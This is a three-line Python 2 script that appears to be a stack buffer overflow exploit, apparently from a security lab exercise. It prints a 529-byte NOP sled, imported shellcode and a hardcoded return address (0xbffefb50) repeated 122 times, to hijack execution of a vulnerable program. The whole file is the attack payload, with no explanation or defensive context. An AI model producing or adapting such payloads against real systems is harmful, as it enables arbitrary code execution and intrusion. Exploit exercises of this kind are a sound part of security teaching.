from shellcode import shellcode
from struct import pack

print '\x90'*529 + shellcode + pack("<I", 0xbffefb50)*122
